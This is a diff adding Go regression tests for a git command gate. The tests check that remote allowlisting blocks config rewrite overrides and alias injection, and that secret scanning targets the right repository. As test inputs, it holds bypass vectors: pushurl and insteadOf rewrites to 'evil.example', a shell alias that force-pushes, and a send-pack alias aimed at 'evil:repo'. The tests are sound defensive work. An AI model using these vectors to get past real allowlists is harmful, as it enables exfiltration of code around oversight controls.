@@ -163,6 +163,125 @@ func TestRemoteAllowlistAllowsApprovedHost(t *testing.T) {
 	}
 }
 
+// TestRemoteRewriteOverrideBlocked is the SEC-4/H-29 regression: a config
+// override that can rewrite the remote at connect time (insteadOf, pushurl) must
+// block a remote-facing command, even if the positional remote resolves to an
+// allowed URL.
+func TestRemoteRewriteOverrideBlocked(t *testing.T) {
+	stubGitQuery(t, func(string, ...string) (string, error) {
+		return "https://internal.example/team/x", nil // the clean, allowed URL
+	})
+
+	pol := allowlistPolicy("internal.example")
+
+	cases := [][]string{
+		{"-c", "url.https://127.0.0.1/.insteadOf=https://internal.example/", "push", "origin", "main"},
+		{"-c", "remote.origin.pushurl=https://evil.example/x", "push", "origin"},
+		{"--config-env", "url.x.insteadOf=EVIL", "push", "origin"},
+		{"--config-env=url.x.pushInsteadOf=EVIL", "push", "origin"},
+	}
+
+	for _, args := range cases {
+		if code, blocked := enforceRemoteAllowlist(pol, args, "git"); !blocked || code != 1 {
+			t.Errorf("rewrite override must block: args=%v code=%d blocked=%v", args, code, blocked)
+		}
+	}
+}
+
+// TestBenignConfigNotBlocked confirms an unrelated -c override does not trip the
+// rewrite gate (only remote-rewriting keys do).
+func TestBenignConfigNotBlocked(t *testing.T) {
+	stubGitQuery(t, func(string, ...string) (string, error) {
+		return "https://internal.example/team/x", nil
+	})
+
+	pol := allowlistPolicy("internal.example")
+	if _, blocked := enforceRemoteAllowlist(pol, []string{"-c", "core.pager=less", "push", "origin"}, "git"); blocked {
+		t.Error("a benign -c override must not be blocked")
+	}
+}
+
+// TestRemoteRewriteViaEnv covers the GIT_CONFIG_KEY_* environment vector.
+func TestRemoteRewriteViaEnv(t *testing.T) {
+	stubGitQuery(t, func(string, ...string) (string, error) {
+		return "https://internal.example/team/x", nil
+	})
+
+	t.Setenv("GIT_CONFIG_KEY_0", "url.https://evil/.insteadOf")
+
+	pol := allowlistPolicy("internal.example")
+	if code, blocked := enforceRemoteAllowlist(pol, []string{"push", "origin"}, "git"); !blocked || code != 1 {
+		t.Errorf("GIT_CONFIG_KEY rewrite must block: code=%d blocked=%v", code, blocked)
+	}
+}
+
+// TestAliasInjection is the SEC-6/H-30 regression: a command-line alias that
+// runs a gated verb or a shell command must be detected, while benign aliases
+// and unrelated -c overrides are left alone.
+func TestAliasInjection(t *testing.T) {
+	t.Parallel()
+
+	block := [][]string{
+		{"-c", "alias.p=push", "p", "origin"},         // alias -> gated verb
+		{"-c", "alias.x=!git push --force", "x"},      // shell alias
+		{"-c", "alias.s=send-pack", "s", "evil:repo"}, // alias -> plumbing exfil verb
+	}
+	for _, a := range block {
+		if _, ok := aliasInjection(a); !ok {
+			t.Errorf("should block alias injection: %v", a)
+		}
+	}
+
+	allow := [][]string{
+		{"-c", "alias.co=checkout", "co"},   // benign alias, non-gated verb
+		{"push", "origin"},                  // no alias at all
+		{"-c", "core.pager=less", "status"}, // unrelated -c override
+		{"-c", "alias.p=push", "status"},    // alias defined but NOT the invoked subcommand
+	}
+	for _, a := range allow {
+		if key, ok := aliasInjection(a); ok {
+			t.Errorf("should NOT block %v (flagged %q)", a, key)
+		}
+	}
+}
+
+// TestSecretScanDirHonorsGlobals is the SEC-7/H-32 regression: the secret gate
+// must scan the repo the command targets (`git -C /repo commit`), resolved via
+// git with the command's own globals, not the process CWD.
+func TestSecretScanDirHonorsGlobals(t *testing.T) {
+	var gotArgs []string
+
+	stubGitQuery(t, func(_ string, args ...string) (string, error) {
+		gotArgs = args
+		return "/resolved/top", nil
+	})
+
+	dir := secretScanDir([]string{"-C", "/repo", "commit", "-m", "x"}, "git")
+	if dir != "/resolved/top" {
+		t.Errorf("scan dir = %q, want the git-resolved toplevel", dir)
+	}
+
+	if len(gotArgs) < 4 || gotArgs[0] != "-C" || gotArgs[1] != "/repo" {
+		t.Errorf("the -C global must be forwarded to rev-parse: %v", gotArgs)
+	}
+
+	if gotArgs[len(gotArgs)-1] != "--show-toplevel" {
+		t.Errorf("expected a rev-parse --show-toplevel query, got %v", gotArgs)
+	}
+}
+
+// TestSecretScanDirFallsBackToCwd: when git cannot resolve a toplevel, scan the
+// current directory (prior behavior).
+func TestSecretScanDirFallsBackToCwd(t *testing.T) {
+	stubGitQuery(t, func(string, ...string) (string, error) {
+		return "", context.DeadlineExceeded
+	})
+
+	if dir := secretScanDir([]string{"commit"}, "git"); dir != "." {
+		t.Errorf("fallback scan dir = %q, want \".\"", dir)
+	}
+}
+
 func TestIsExecFailure(t *testing.T) {
 	if isExecFailure(nil) {
 		t.Error("nil is not a failure")
